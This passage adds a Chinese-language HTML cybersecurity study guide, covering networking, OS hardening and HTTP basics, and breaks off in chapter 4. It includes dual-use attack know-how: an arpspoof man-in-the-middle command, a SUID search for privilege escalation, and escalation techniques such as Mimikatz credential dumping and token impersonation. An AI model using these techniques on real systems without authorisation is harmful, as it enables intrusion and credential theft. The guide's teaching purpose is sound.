@@ -1,0 +1,3836 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>网络安全从入门到精通 · 学习笔记</title>
+    <style>
+      :root {
+        --bg: #08111f;
+        --panel: #0e1a2d;
+        --panel-hover: #132238;
+        --code-green: #62f6a8;
+        --link-blue: #7ab7ff;
+        --text: #e6edf7;
+        --text-secondary: #8ea0b8;
+        --border: #1d2b44;
+        --accent: #ef4444;
+        --accent-soft: rgba(239, 68, 68, 0.12);
+        --warn: #ffd166;
+        --danger: #ff6b6b;
+        --info: #7ab7ff;
+        --sidebar-w: 280px;
+        --radius: 8px;
+        --font-mono:
+          'JetBrains Mono', 'SF Mono', 'Cascadia Code', Consolas, 'Courier New',
+          monospace;
+        --font-sans:
+          'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
+          'Noto Sans SC', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+      }
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      html {
+        scroll-behavior: smooth;
+        font-size: 16px;
+      }
+      body {
+        font-family: var(--font-sans);
+        background: var(--bg);
+        color: var(--text);
+        line-height: 1.75;
+        -webkit-font-smoothing: antialiased;
+        overflow-x: hidden;
+      }
+      ::-webkit-scrollbar {
+        width: 6px;
+        height: 6px;
+      }
+      ::-webkit-scrollbar-track {
+        background: transparent;
+      }
+      ::-webkit-scrollbar-thumb {
+        background: var(--border);
+        border-radius: 3px;
+      }
+      ::-webkit-scrollbar-thumb:hover {
+        background: #2a3f5f;
+      }
+
+      .sidebar {
+        position: fixed;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        width: var(--sidebar-w);
+        background: var(--panel);
+        border-right: 1px solid var(--border);
+        overflow-y: auto;
+        z-index: 100;
+        padding: 24px 0;
+        transition: transform 0.3s ease;
+      }
+      .sidebar-logo {
+        padding: 0 24px 20px;
+        border-bottom: 1px solid var(--border);
+        margin-bottom: 16px;
+      }
+      .sidebar-logo h2 {
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: var(--accent);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .sidebar-logo .logo-icon {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 32px;
+        height: 32px;
+        background: var(--accent-soft);
+        border-radius: 6px;
+        font-size: 1.1rem;
+      }
+      .sidebar-logo p {
+        font-size: 0.78rem;
+        color: var(--text-secondary);
+        margin-top: 4px;
+      }
+      .toc {
+        list-style: none;
+        padding: 0 12px;
+      }
+      .toc-section-title {
+        font-size: 0.7rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        color: var(--text-secondary);
+        padding: 16px 12px 6px;
+      }
+      .toc li a {
+        display: block;
+        padding: 6px 12px;
+        color: var(--text-secondary);
+        text-decoration: none;
+        font-size: 0.875rem;
+        border-radius: 6px;
+        transition: all 0.15s;
+        border-left: 2px solid transparent;
+      }
+      .toc li a:hover {
+        color: var(--text);
+        background: var(--panel-hover);
+      }
+      .toc li a.active {
+        color: var(--accent);
+        background: var(--accent-soft);
+        border-left-color: var(--accent);
+      }
+
+      .main {
+        margin-left: var(--sidebar-w);
+        padding: 40px 48px 80px;
+        max-width: 960px;
+      }
+
+      .hero {
+        margin-bottom: 48px;
+        padding-bottom: 32px;
+        border-bottom: 1px solid var(--border);
+      }
+      .hero-badge {
+        display: inline-block;
+        padding: 4px 12px;
+        background: var(--accent-soft);
+        color: var(--accent);
+        border-radius: 20px;
+        font-size: 0.78rem;
+        font-weight: 600;
+        margin-bottom: 16px;
+      }
+      .hero h1 {
+        font-size: 2.4rem;
+        font-weight: 800;
+        line-height: 1.2;
+        margin-bottom: 12px;
+        background: linear-gradient(135deg, #e6edf7 0%, #ef4444 100%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .hero p {
+        font-size: 1.05rem;
+        color: var(--text-secondary);
+        max-width: 640px;
+      }
+      .hero-meta {
+        display: flex;
+        gap: 24px;
+        margin-top: 20px;
+        flex-wrap: wrap;
+      }
+      .hero-meta span {
+        font-size: 0.85rem;
+        color: var(--text-secondary);
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .hero-meta .dot {
+        width: 6px;
+        height: 6px;
+        background: var(--accent);
+        border-radius: 50%;
+      }
+
+      .section {
+        margin-bottom: 56px;
+        scroll-margin-top: 24px;
+      }
+      .section h2 {
+        font-size: 1.6rem;
+        font-weight: 700;
+        margin-bottom: 20px;
+        padding-bottom: 12px;
+        border-bottom: 1px solid var(--border);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .section h2 .num {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 32px;
+        height: 32px;
+        background: var(--accent-soft);
+        color: var(--accent);
+        border-radius: 6px;
+        font-size: 0.9rem;
+        font-weight: 700;
+        font-family: var(--font-mono);
+      }
+      .section h3 {
+        font-size: 1.2rem;
+        font-weight: 600;
+        margin: 28px 0 12px;
+        color: var(--text);
+      }
+      .section h4 {
+        font-size: 1rem;
+        font-weight: 600;
+        margin: 20px 0 8px;
+        color: var(--link-blue);
+      }
+      .section p {
+        margin-bottom: 12px;
+      }
+      .section ul,
+      .section ol {
+        margin: 8px 0 16px 24px;
+      }
+      .section li {
+        margin-bottom: 6px;
+      }
+      .section strong {
+        color: var(--accent);
+        font-weight: 600;
+      }
+      .section a {
+        color: var(--link-blue);
+        text-decoration: none;
+      }
+      .section a:hover {
+        text-decoration: underline;
+      }
+
+      pre {
+        background: #060e1a;
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        padding: 16px 20px;
+        overflow-x: auto;
+        margin: 12px 0 20px;
+        position: relative;
+      }
+      code {
+        font-family: var(--font-mono);
+        font-size: 0.875rem;
+        line-height: 1.6;
+      }
+      pre code {
+        color: #c8d6e5;
+      }
+      :not(pre) > code {
+        background: var(--accent-soft);
+        color: var(--accent);
+        padding: 2px 7px;
+        border-radius: 4px;
+        font-size: 0.85em;
+      }
+
+      .copy-btn {
+        position: absolute;
+        top: 8px;
+        right: 8px;
+        background: var(--panel-hover);
+        border: 1px solid var(--border);
+        color: var(--text-secondary);
+        border-radius: 5px;
+        padding: 4px 10px;
+        font-size: 0.75rem;
+        cursor: pointer;
+        font-family: var(--font-sans);
+        transition: all 0.15s;
+        opacity: 0;
+      }
+      pre:hover .copy-btn {
+        opacity: 1;
+      }
+      .copy-btn:hover {
+        background: var(--accent);
+        color: #fff;
+        border-color: var(--accent);
+      }
+
+      .tip,
+      .warn,
+      .danger,
+      .info {
+        padding: 14px 18px;
+        border-radius: var(--radius);
+        margin: 16px 0;
+        border-left: 4px solid;
+        font-size: 0.92rem;
+      }
+      .tip {
+        background: rgba(98, 246, 168, 0.06);
+        border-color: var(--code-green);
+      }
+      .warn {
+        background: rgba(255, 209, 102, 0.06);
+        border-color: var(--warn);
+      }
+      .danger {
+        background: rgba(255, 107, 107, 0.06);
+        border-color: var(--danger);
+      }
+      .info {
+        background: rgba(122, 183, 255, 0.06);
+        border-color: var(--info);
+      }
+      .tip::before {
+        content: '💡 ';
+      }
+      .warn::before {
+        content: '⚠️ ';
+      }
+      .danger::before {
+        content: '🚫 ';
+      }
+      .info::before {
+        content: '📌 ';
+      }
+
+      .table-wrap {
+        overflow-x: auto;
+        margin: 16px 0 20px;
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 0.9rem;
+      }
+      th,
+      td {
+        padding: 10px 14px;
+        text-align: left;
+        border-bottom: 1px solid var(--border);
+      }
+      th {
+        background: var(--panel);
+        color: var(--accent);
+        font-weight: 600;
+        white-space: nowrap;
+      }
+      tr:hover td {
+        background: var(--panel-hover);
+      }
+
+      .back-home {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.88rem;
+        font-weight: 600;
+        margin-bottom: 28px;
+        padding: 8px 18px;
+        border: 1px solid var(--accent);
+        border-radius: 20px;
+        background: var(--accent-soft);
+        transition: all 0.2s ease;
+      }
+      .back-home:hover {
+        background: var(--accent);
+        color: #fff;
+        transform: translateX(-3px);
+        box-shadow: 0 4px 16px var(--accent-soft);
+      }
+
+      .menu-toggle {
+        display: none;
+        position: fixed;
+        top: 16px;
+        left: 16px;
+        z-index: 200;
+        background: var(--panel);
+        border: 1px solid var(--border);
+        color: var(--text);
+        width: 40px;
+        height: 40px;
+        border-radius: 8px;
+        font-size: 1.2rem;
+        cursor: pointer;
+        align-items: center;
+        justify-content: center;
+      }
+
+      @media (max-width: 900px) {
+        .sidebar {
+          transform: translateX(-100%);
+        }
+        .sidebar.open {
+          transform: translateX(0);
+        }
+        .main {
+          margin-left: 0;
+          padding: 64px 20px 60px;
+        }
+        .menu-toggle {
+          display: flex;
+        }
+        .hero h1 {
+          font-size: 1.8rem;
+        }
+      }
+
+      :focus-visible {
+        outline: 2px solid var(--accent);
+        outline-offset: 3px;
+        border-radius: 4px;
+      }
+      @media (prefers-reduced-motion: reduce) {
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          transition-duration: 0.01ms !important;
+        }
+      }
+      @media print {
+        body {
+          background: #fff;
+          color: #000;
+        }
+        .sidebar,
+        .menu-toggle,
+        .copy-btn,
+        .back-home {
+          display: none !important;
+        }
+        .main {
+          margin-left: 0;
+          max-width: 100%;
+          padding: 0;
+        }
+        pre {
+          background: #f5f5f5;
+          color: #000;
+          border: 1px solid #ccc;
+          white-space: pre-wrap;
+          word-wrap: break-word;
+        }
+        pre code {
+          color: #000;
+        }
+        .section {
+          break-inside: avoid;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <button
+      class="menu-toggle"
+      onclick="document.querySelector('.sidebar').classList.toggle('open')"
+      aria-label="菜单">
+      ☰
+    </button>
+
+    <nav class="sidebar">
+      <div class="sidebar-logo">
+        <h2><span class="logo-icon">🛡️</span> 网络安全笔记</h2>
+        <p>从入门到精通 · 18章完整版</p>
+      </div>
+      <ul class="toc">
+        <li><a href="indexLearning.html">← 返回主页</a></li>
+        <li class="toc-section-title">入门基础</li>
+        <li><a href="#ch1">1. 网络安全概述</a></li>
+        <li><a href="#ch2">2. 网络基础与TCP/IP</a></li>
+        <li><a href="#ch3">3. 操作系统安全</a></li>
+        <li><a href="#ch4">4. Web基础与HTTP</a></li>
+        <li><a href="#ch5">5. 法律法规与道德</a></li>
+        <li class="toc-section-title">进阶技术</li>
+        <li><a href="#ch6">6. 信息收集与侦察</a></li>
+        <li><a href="#ch7">7. 漏洞扫描与渗透测试</a></li>
+        <li><a href="#ch8">8. Web安全与OWASP Top 10</a></li>
+        <li><a href="#ch9">9. 密码学与加密技术</a></li>
+        <li><a href="#ch10">10. 网络攻击与防御</a></li>
+        <li class="toc-section-title">高级实战</li>
+        <li><a href="#ch11">11. 渗透测试工具集</a></li>
+        <li><a href="#ch12">12. 社会工程学</a></li>
+        <li><a href="#ch13">13. 无线网络安全</a></li>
+        <li><a href="#ch14">14. 逆向与恶意代码分析</a></li>
+        <li><a href="#ch15">15. 云安全与容器安全</a></li>
+        <li class="toc-section-title">精通与职业</li>
+        <li><a href="#ch16">16. 应急响应与数字取证</a></li>
+        <li><a href="#ch17">17. SOC与SIEM安全运营</a></li>
+        <li><a href="#ch18">18. 安全架构与职业规划</a></li>
+      </ul>
+    </nav>
+
+    <main class="main">
+      <header class="hero">
+        <span class="hero-badge">🔐 Cybersecurity · 从入门到精通</span>
+        <h1>网络安全从入门到精通</h1>
+        <p>
+          系统化掌握网络安全知识体系：从网络协议、操作系统安全到渗透测试、Web攻防、密码学、应急响应与安全架构，18章覆盖攻防全链路，配有实战命令与工具详解。
+        </p>
+        <div class="hero-meta">
+          <span><span class="dot"></span>18 章 · 四阶段</span>
+          <span><span class="dot"></span>攻防实战</span>
+          <span><span class="dot"></span>工具详解</span>
+          <span><span class="dot"></span>持续更新</span>
+        </div>
+      </header>
+
+      <!-- ==================== 第一章 ==================== -->
+      <section class="section" id="ch1">
+        <h2><span class="num">01</span> 网络安全概述与职业发展</h2>
+
+        <h3>1.1 什么是网络安全</h3>
+        <p>
+          网络安全（Cybersecurity）是指通过技术、管理和法律手段，保护计算机系统、网络、数据和服务免受未经授权的访问、攻击、破坏或泄露。其核心目标可概括为
+          <strong>CIA 三元组</strong>：
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>属性</th>
+              <th>英文</th>
+              <th>含义</th>
+              <th>典型威胁</th>
+            </tr>
+            <tr>
+              <td>机密性</td>
+              <td>Confidentiality</td>
+              <td>信息不被未授权者获取</td>
+              <td>数据泄露、窃听</td>
+            </tr>
+            <tr>
+              <td>完整性</td>
+              <td>Integrity</td>
+              <td>数据不被非法篡改</td>
+              <td>中间人篡改、勒索病毒</td>
+            </tr>
+            <tr>
+              <td>可用性</td>
+              <td>Availability</td>
+              <td>服务和数据随时可访问</td>
+              <td>DDoS 攻击、硬件故障</td>
+            </tr>
+          </table>
+        </div>
+
+        <p>
+          在此基础上，现代安全还扩展了<strong>可认证性（Authenticity）</strong>、<strong>不可否认性（Non-repudiation）</strong>和<strong>可控性（Controllability）</strong>。
+        </p>
+
+        <h3>1.2 网络安全的领域划分</h3>
+        <ul>
+          <li>
+            <strong>网络基础设施安全</strong>：防火墙、IDS/IPS、VPN、网络隔离
+          </li>
+          <li>
+            <strong>终端安全</strong>：杀毒软件、EDR、主机加固、移动设备管理
+          </li>
+          <li>
+            <strong>应用安全</strong>：Web 安全、代码审计、API 安全、移动 App
+            安全
+          </li>
+          <li><strong>数据安全</strong>：加密、DLP、数据分类分级、备份恢复</li>
+          <li>
+            <strong>身份与访问管理（IAM）</strong>：SSO、MFA、零信任、最小权限
+          </li>
+          <li>
+            <strong>云安全</strong>：云配置审计、容器安全、Serverless 安全
+          </li>
+          <li><strong>安全运营</strong>：SOC、SIEM、威胁情报、应急响应</li>
+        </ul>
+
+        <h3>1.3 网络安全职业方向</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>方向</th>
+              <th>核心技能</th>
+              <th>常见岗位</th>
+            </tr>
+            <tr>
+              <td>渗透测试 / Red Team</td>
+              <td>漏洞利用、内网渗透、社会工程学</td>
+              <td>渗透测试工程师、红队队员</td>
+            </tr>
+            <tr>
+              <td>安全运维 / Blue Team</td>
+              <td>日志分析、入侵检测、应急响应</td>
+              <td>安全运维工程师、SOC 分析师</td>
+            </tr>
+            <tr>
+              <td>安全研究</td>
+              <td>逆向工程、漏洞挖掘、恶意代码分析</td>
+              <td>安全研究员、病毒分析师</td>
+            </tr>
+            <tr>
+              <td>安全开发（SecDev）</td>
+              <td>安全编码、代码审计、DevSecOps</td>
+              <td>安全开发工程师、安全架构师</td>
+            </tr>
+            <tr>
+              <td>合规与治理</td>
+              <td>等保、ISO 27001、风险评估</td>
+              <td>安全合规经理、CISO</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>1.4 学习路线图</h3>
+        <p>网络安全的学习路径建议分为四个阶段：</p>
+        <ol>
+          <li>
+            <strong>基础阶段</strong>：计算机网络 → 操作系统（Linux/Windows）→
+            Web 基础 → 编程语言（Python）
+          </li>
+          <li>
+            <strong>入门阶段</strong>：HTTP 协议 → Web 漏洞原理 → 常用安全工具 →
+            简单渗透测试
+          </li>
+          <li>
+            <strong>进阶阶段</strong>：内网渗透 → 密码学 → 逆向工程 → 云安全 →
+            二进制漏洞
+          </li>
+          <li>
+            <strong>专业阶段</strong>：选定方向深入（红队/蓝队/研究/架构）→
+            实战演练 → CTF → 行业认证
+          </li>
+        </ol>
+
+        <div class="tip">
+          <strong>学习建议：</strong>不要一上来就用工具"跑漏洞"。先花 2-3
+          个月打好网络和系统基础，理解协议和原理，后期学漏洞会事半功倍。
+        </div>
+
+        <h3>1.5 常见认证体系</h3>
+        <ul>
+          <li><strong>入门级</strong>：CompTIA Security+、CEH（道德黑客）</li>
+          <li>
+            <strong>进阶级</strong>：OSCP（渗透测试黄金认证）、CISSP（安全管理）
+          </li>
+          <li>
+            <strong>专家级</strong>：OSEP（内网渗透）、OSWE（Web 渗透）、GXPN
+          </li>
+          <li>
+            <strong>国内认证</strong
+            >：CISP（注册信息安全专业人员）、NISP、等保测评师
+          </li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第二章 ==================== -->
+      <section class="section" id="ch2">
+        <h2><span class="num">02</span> 网络基础与 TCP/IP 协议栈</h2>
+
+        <h3>2.1 OSI 七层与 TCP/IP 四层模型</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>OSI 层级</th>
+              <th>TCP/IP 层级</th>
+              <th>核心协议</th>
+              <th>安全关注点</th>
+            </tr>
+            <tr>
+              <td>应用层</td>
+              <td rowspan="3">应用层</td>
+              <td>HTTP/HTTPS、FTP、DNS、SMTP</td>
+              <td>Web 漏洞、明文传输、DNS 劫持</td>
+            </tr>
+            <tr>
+              <td>表示层</td>
+              <td>SSL/TLS、JPEG、ASCII</td>
+              <td>加密、编码绕过</td>
+            </tr>
+            <tr>
+              <td>会话层</td>
+              <td>RPC、NetBIOS</td>
+              <td>会话劫持</td>
+            </tr>
+            <tr>
+              <td>传输层</td>
+              <td>传输层</td>
+              <td>TCP、UDP</td>
+              <td>端口扫描、SYN Flood</td>
+            </tr>
+            <tr>
+              <td>网络层</td>
+              <td>网际层</td>
+              <td>IP、ICMP、ARP、OSPF</td>
+              <td>IP 欺骗、ICMP 隧道</td>
+            </tr>
+            <tr>
+              <td>数据链路层</td>
+              <td rowspan="2">网络接口层</td>
+              <td>Ethernet、PPP、Wi-Fi</td>
+              <td>ARP 欺骗、MAC 泛洪</td>
+            </tr>
+            <tr>
+              <td>物理层</td>
+              <td>光纤、双绞线、无线电</td>
+              <td>物理接入、电磁泄漏</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>2.2 TCP 三次握手与四次挥手</h3>
+        <p>
+          TCP 是面向连接的可靠传输协议，理解握手和挥手过程是分析端口扫描和 DoS
+          攻击的基础。
+        </p>
+
+        <h4>三次握手（建立连接）</h4>
+        <pre><code>客户端                    服务端
+  |--- SYN, seq=x ------->|   (1) 客户端发送 SYN
+  |                        |
+  |&lt;-- SYN, ACK, seq=y, ack=x+1 ---|   (2) 服务端回复 SYN+ACK
+  |                        |
+  |--- ACK, ack=y+1 ------>|   (3) 客户端回复 ACK
+  |                        |
+  |===== 连接建立 =========|</code></pre>
+
+        <h4>四次挥手（断开连接）</h4>
+        <pre><code>客户端                    服务端
+  |--- FIN, seq=u ------->|   (1) 主动关闭方发送 FIN
+  |&lt;-- ACK, ack=u+1 ------|   (2) 被动方回复 ACK
+  |                        |   (被动方可能还有数据要发送)
+  |&lt;-- FIN, seq=v ---------|   (3) 被动方发送 FIN
+  |--- ACK, ack=v+1 ------>|   (4) 主动方回复 ACK
+  |                        |
+  |===== 连接断开 =========|</code></pre>
+
+        <h3>2.3 常见端口与服务</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>端口</th>
+              <th>协议</th>
+              <th>服务</th>
+              <th>安全风险</th>
+            </tr>
+            <tr>
+              <td>20/21</td>
+              <td>TCP</td>
+              <td>FTP</td>
+              <td>明文传输、匿名访问</td>
+            </tr>
+            <tr>
+              <td>22</td>
+              <td>TCP</td>
+              <td>SSH</td>
+              <td>暴力破解、弱口令</td>
+            </tr>
+            <tr>
+              <td>23</td>
+              <td>TCP</td>
+              <td>Telnet</td>
+              <td>明文传输（应禁用）</td>
+            </tr>
+            <tr>
+              <td>25</td>
+              <td>TCP</td>
+              <td>SMTP</td>
+              <td>邮件中继、钓鱼</td>
+            </tr>
+            <tr>
+              <td>53</td>
+              <td>UDP/TCP</td>
+              <td>DNS</td>
+              <td>DNS 劫持、DNS 隧道、放大攻击</td>
+            </tr>
+            <tr>
+              <td>80</td>
+              <td>TCP</td>
+              <td>HTTP</td>
+              <td>Web 漏洞、明文</td>
+            </tr>
+            <tr>
+              <td>110</td>
+              <td>TCP</td>
+              <td>POP3</td>
+              <td>明文邮件</td>
+            </tr>
+            <tr>
+              <td>139/445</td>
+              <td>TCP</td>
+              <td>SMB</td>
+              <td>永恒之蓝、勒索病毒</td>
+            </tr>
+            <tr>
+              <td>443</td>
+              <td>TCP</td>
+              <td>HTTPS</td>
+              <td>SSL 漏洞、证书问题</td>
+            </tr>
+            <tr>
+              <td>1433</td>
+              <td>TCP</td>
+              <td>MSSQL</td>
+              <td>弱口令、注入</td>
+            </tr>
+            <tr>
+              <td>3306</td>
+              <td>TCP</td>
+              <td>MySQL</td>
+              <td>弱口令、未授权访问</td>
+            </tr>
+            <tr>
+              <td>3389</td>
+              <td>TCP</td>
+              <td>RDP</td>
+              <td>暴力破解、BlueKeep</td>
+            </tr>
+            <tr>
+              <td>6379</td>
+              <td>TCP</td>
+              <td>Redis</td>
+              <td>未授权访问、写 SSH 公钥</td>
+            </tr>
+            <tr>
+              <td>8080</td>
+              <td>TCP</td>
+              <td>HTTP-Proxy</td>
+              <td>管理后台暴露</td>
+            </tr>
+            <tr>
+              <td>27017</td>
+              <td>TCP</td>
+              <td>MongoDB</td>
+              <td>未授权访问</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>2.4 子网划分与 CIDR</h3>
+        <p>理解 IP 地址和子网划分对网络扫描、内网渗透至关重要。</p>
+        <pre><code># 常见 CIDR 表示
+192.168.1.0/24    → 256 个地址（192.168.1.0 - 192.168.1.255）
+10.0.0.0/8       → 16,777,216 个地址
+172.16.0.0/12    → 1,048,576 个地址
+10.0.0.0/16      → 65,536 个地址
+
+# 私有 IP 范围
+A 类：10.0.0.0    - 10.255.255.255
+B 类：172.16.0.0  - 172.31.255.255
+C 类：192.168.0.0 - 192.168.255.255</code></pre>
+
+        <h3>2.5 核心网络工具</h3>
+        <pre><code># ping — 测试连通性（ICMP）
+ping -c 4 192.168.1.1
+
+# traceroute — 路由追踪
+traceroute 8.8.8.8
+tracert 8.8.8.1        # Windows
+
+# netstat — 查看网络连接
+netstat -tulnp         # Linux 查看监听端口
+netstat -ano           # Windows 查看所有连接
+
+# ss — 现代 netstat 替代
+ss -tulnp
+
+# dig/nslookup — DNS 查询
+dig example.com
+dig +short example.com
+nslookup example.com
+
+# tcpdump — 抓包
+tcpdump -i eth0 port 80
+tcpdump -i any -w capture.pcap
+tcpdump -r capture.pcap
+
+# ip/ifconfig — 网络接口
+ip addr show
+ip route show</code></pre>
+
+        <h3>2.6 ARP 协议与欺骗原理</h3>
+        <p>
+          ARP（地址解析协议）用于将 IP 地址解析为 MAC 地址。由于 ARP
+          无状态、不认证，攻击者可发送伪造的 ARP 应答实现中间人攻击。
+        </p>
+        <pre><code># 查看 ARP 缓存
+arp -a
+ip neigh show
+
+# ARP 欺骗原理（使用 arpspoof）
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# 开启 IP 转发（Linux）
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 防御：静态 ARP 绑定 / DAI（动态 ARP 检测）
+arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff</code></pre>
+      </section>
+
+      <!-- ==================== 第三章 ==================== -->
+      <section class="section" id="ch3">
+        <h2><span class="num">03</span> 操作系统安全基础</h2>
+
+        <h3>3.1 Linux 安全基础</h3>
+
+        <h4>用户与权限管理</h4>
+        <pre><code># 用户管理
+useradd -m -s /bin/bash alice    # 创建用户
+passwd alice                     # 设置密码
+usermod -aG sudo alice           # 加入 sudo 组
+userdel -r alice                 # 删除用户及家目录
+
+# 文件权限
+chmod 750 script.sh    # rwxr-x---
+chown alice:dev file   # 修改属主和属组
+chmod +s /usr/bin/file # 设置 SUID（危险！）
+
+# 查看 SUID/SGID 文件（提权排查）
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+# sudo 配置
+visudo
+# alice ALL=(ALL) NOPASSWD: /usr/bin/apt</code></pre>
+
+        <h4>Linux 提权常见路径</h4>
+        <ul>
+          <li>
+            <strong>内核漏洞</strong>：Dirty COW (CVE-2016-5195)、PwnKit
+            (CVE-2021-4034)
+          </li>
+          <li>
+            <strong>SUID 程序</strong>：查找
+            <code>find / -perm -4000</code>，利用 GTFOBins
+          </li>
+          <li>
+            <strong>sudo 配置错误</strong>：<code>sudo -l</code>
+            查看可执行的特权命令
+          </li>
+          <li>
+            <strong>计划任务</strong>：<code>/etc/crontab</code>、<code
+              >/var/spool/cron/</code
+            >
+          </li>
+          <li><strong>可写的 /etc/passwd</strong>：直接添加 root 权限用户</li>
+          <li>
+            <strong> capability 配置不当</strong>：<code
+              >getcap -r / 2>/dev/null</code
+            >
+          </li>
+        </ul>
+
+        <h4>Linux 加固检查清单</h4>
+        <pre><code># SSH 加固 (/etc/ssh/sshd_config)
+PermitRootLogin no
+PasswordAuthentication no
+Port 2222
+AllowUsers alice
+
+# 检查空密码用户
+awk -F: '($2 == "") {print $1}' /etc/shadow
+
+# 检查可登录用户
+grep -v '/nologin\|/false' /etc/passwd
+
+# 查看登录历史
+last
+lastb          # 失败登录
+who / w        # 当前在线
+
+# 防火墙 (ufw/iptables)
+ufw default deny incoming
+ufw allow 2222/tcp
+ufw enable
+
+# 自动安全更新
+apt install unattended-upgrades
+dpkg-reconfigure -plow unattended-upgrades</code></pre>
+
+        <h3>3.2 Windows 安全基础</h3>
+
+        <h4>用户账户控制（UAC）与权限</h4>
+        <pre><code># 查看用户
+net user
+net user administrator
+whoami /all
+whoami /priv
+
+# 查看本地组
+net localgroup administrators
+
+# 查看网络连接
+netstat -ano | findstr LISTENING
+
+# 查看进程
+tasklist /svc
+wmic process get name,processid,commandline
+
+# 查看服务
+sc query
+wmic service where state="running" get name,pathname
+
+# 查看计划任务
+schtasks /query /fo LIST /v
+
+# 防火墙
+netsh advfirewall show allprofiles
+netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=TCP localport=22</code></pre>
+
+        <h4>Windows 提权常见路径</h4>
+        <ul>
+          <li>
+            <strong>服务配置错误</strong
+            >：未引用路径、可写服务二进制文件、弱权限服务
+          </li>
+          <li>
+            <strong>AlwaysInstallElevated</strong>：注册表项允许任何用户以
+            SYSTEM 权限安装 MSI
+          </li>
+          <li>
+            <strong>凭证转储</strong>：Mimikatz 读取 LSASS 内存中的密码/Hash
+          </li>
+          <li>
+            <strong>令牌假冒</strong>：JuicyPotato、PrintSpoofer、RoguePotato
+          </li>
+          <li><strong>内核漏洞</strong>：MS17-010（永恒之蓝）、MS16-032</li>
+          <li><strong>DLL 劫持</strong>：程序加载 DLL 时搜索顺序被利用</li>
+        </ul>
+
+        <h3>3.3 日志与审计</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>系统</th>
+              <th>日志位置/工具</th>
+              <th>关键日志</th>
+            </tr>
+            <tr>
+              <td>Linux</td>
+              <td>/var/log/auth.log、/var/log/syslog</td>
+              <td>SSH 登录、sudo 使用、cron</td>
+            </tr>
+            <tr>
+              <td>Windows</td>
+              <td>事件查看器（eventvwr.msc）</td>
+              <td>
+                安全日志 4624（登录成功）、4625（登录失败）、4672（特权登录）
+              </td>
+            </tr>
+            <tr>
+              <td>Web 服务器</td>
+              <td>Nginx/Apache access.log、error.log</td>
+              <td>异常请求、SQL 注入特征、扫描行为</td>
+            </tr>
+          </table>
+        </div>
+      </section>
+
+      <!-- ==================== 第四章 ==================== -->
+      <section class="section" id="ch4">
+        <h2><span class="num">04</span> Web 基础与 HTTP 协议</h2>
+
+        <h3>4.1 HTTP 请求与响应结构</h3>
+
+        <h4>HTTP 请求</h4>
+        <pre><code>GET /api/users?id=1 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Accept: application/json
+Cookie: session=abc123
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+</code></pre>
+
+        <h4>HTTP 响应</h4>
+        <pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+Set-Cookie: session=xyz789; HttpOnly; Secure
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+
+{"id":1,"name":"Alice","role":"admin"}</code></pre>
+
+        <h3>4.2 HTTP 方法与状态码</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>方法</th>
+              <th>用途</th>
+              <th>安全注意</th>
+            </tr>
+            <tr>
+              <td>GET</td>
+              <td>获取资源</td>
+              <td>参数在 URL 中，不应放敏感信息</td>
+            </tr>
+            <tr>
+              <td>POST</td>
+              <td>提交数据</td>
+              <td>参数在 body，用于写操作</td>
+            </tr>
+            <tr>
+              <td>PUT</td>
+              <td>更新资源</td>
+              <td>需鉴权，注意幂等性</td>
+            </tr>
+            <tr>
+              <td>DELETE</td>
+              <td>删除资源</td>
+              <td>需鉴权，防止 CSRF</td>
+            </tr>
+            <tr>
+              <td>OPTIONS</td>
+              <td>查询支持的方法</td>
+              <td>CORS 预检请求</td>
+            </tr>
+            <tr>
+              <td>PATCH</td>
+              <td>部分更新</td>
+              <td>需鉴权</td>
+            </tr>
+          </table>
+        </div>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>状态码</th>
+              <th>含义</th>
+              <th>常见场景</th>
+            </tr>
+            <tr>
+              <td>200</td>
+              <td>OK</td>
+              <td>请求成功</td>
+            </tr>
+            <tr>
+              <td>301/302</td>
+              <td>重定向</td>
+              <td>开放重定向漏洞</td>
+            </tr>
+            <tr>
+              <td>400</td>
+              <td>Bad Request</td>
+              <td>参数错误</td>
+            </tr>
+            <tr>
+              <td>401</td>
+              <td>Unauthorized</td>
+              <td>未认证</td>
+            </tr>
+            <tr>
